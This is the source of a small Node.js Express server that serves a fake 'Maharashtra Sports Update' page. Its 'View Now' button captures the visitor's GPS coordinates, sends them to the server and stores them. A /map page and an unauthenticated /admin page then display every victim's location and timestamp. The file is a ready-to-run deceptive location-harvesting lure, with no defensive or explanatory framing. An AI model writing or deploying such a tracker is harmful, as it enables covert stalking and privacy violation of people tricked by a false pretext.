const express = require('express');
const app = express();

app.use(express.json());
app.set('trust proxy', true);

// STORE DATA (temporary memory)
let locations = [];

// MAIN PAGE
app.get('/', (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Maharashtra Sports Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
      body {
        font-family: sans-serif;
        background: #f5f5f5;
        text-align: center;
        padding-top: 80px;
      }

      .card {
        background: white;
        margin: 20px;
        padding: 25px;
        border-radius: 15px;
        box-shadow: 0 5px 20px rgba(0,0,0,0.1);
      }

      button {
        background: #007aff;
        color: white;
        border: none;
        padding: 12px 25px;
        border-radius: 25px;
        font-size: 16px;
      }
    </style>
  </head>

  <body>
    <div class="card">
      <h2>🏆 Maharashtra Sports Update</h2>
      <p>Click below to continue</p>

      <button onclick="goNext()">View Now</button>
    </div>

    <script>
      function goNext() {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            fetch('/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                lat: position.coords.latitude,
                lon: position.coords.longitude
              })
            }).then(() => {
              window.location.href = "/map";
            });
          },
          () => {
            alert("Location permission required to continue");
          }
        );
      }
    </script>
  </body>
  </html>
  `);
});

// SAVE LOCATION
app.post('/location', (req, res) => {
  const { lat, lon } = req.body;

  locations.push({ lat, lon, time: new Date() });

  console.log("Saved:", lat, lon);

  res.sendStatus(200);
});

// MAP PAGE
app.get('/map', (req, res) => {
  const last = locations[locations.length - 1];

  if (!last) {
    return res.send("No data");
  }

  res.send(`
    <h2>📍 Location Captured</h2>
    <p>Latitude: ${last.lat}</p>
    <p>Longitude: ${last.lon}</p>

    <iframe
      width="100%"
      height="400"
      src="https://maps.google.com/maps?q=${last.lat},${last.lon}&z=15&output=embed">
    </iframe>
  `);
});

// ADMIN DASHBOARD
app.get('/admin', (req, res) => {
  let html = "<h2>All Locations</h2>";

  locations.forEach(loc => {
    html += `
      <p>
        ${loc.lat}, ${loc.lon} <br>
        ${loc.time}
      </p>
      <hr>
    `;
  });

  res.send(html);
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running...");
});
